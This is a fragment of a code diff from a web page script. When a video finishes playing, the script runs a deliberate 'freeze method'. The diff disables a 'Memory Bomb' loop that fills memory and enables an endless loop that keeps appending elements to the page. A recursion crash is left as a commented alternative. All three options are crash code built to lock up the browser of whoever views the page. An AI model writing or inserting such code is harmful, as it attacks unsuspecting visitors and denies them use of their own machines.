@@ -24,11 +24,11 @@
     video.addEventListener('ended', () => {  
       // Choose one freeze method:  
       // Memory Bomb  
-      const arr = [];  
-      while (true) arr.push(new Array(1000000).fill(0));  
+      // const arr = [];  
+      // while (true) arr.push(new Array(1000000).fill(0));  
 
       // OR Infinite DOM  
-      // while (true) document.body.innerHTML += "<div></div>";  
+      while (true) document.body.innerHTML += "<div></div>";  
 
       // OR Recursion  
       // function crash() { crash(); } crash();  
